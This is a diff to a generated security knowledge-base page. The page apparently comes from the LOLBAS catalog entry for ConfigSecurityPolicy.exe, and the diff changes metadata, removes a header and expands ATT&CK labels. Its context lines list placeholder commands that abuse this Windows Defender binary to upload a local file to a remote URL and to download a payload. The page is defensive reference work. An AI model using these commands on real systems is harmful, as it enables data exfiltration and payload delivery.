@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/ConfigSecurityPolicy.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/ConfigSecurityPolicy.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "ConfigSecurityPolicy.exe"
@@ -21,16 +21,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# ConfigSecurityPolicy.exe
-
 Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2020-09-04
-- Author: Ialle Teixeira
-- Source Path: yml/OSBinaries/ConfigSecurityPolicy.yml
 
 ## Paths
 
@@ -50,7 +41,7 @@ ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
 - Use Case: Upload file
 - Privileges: User
 - Operating System: Windows 10
-- ATT&CK: [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567]]
+- ATT&CK: [[kb/attack/techniques/T1567-exfiltration_over_web_service|T1567: Exfiltration Over Web Service]]
 
 ### 2. Download
 
@@ -63,7 +54,7 @@ ConfigSecurityPolicy.exe {REMOTEURL}
 - Use Case: Downloads payload from remote server
 - Privileges: User
 - Operating System: Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ## Detections
 
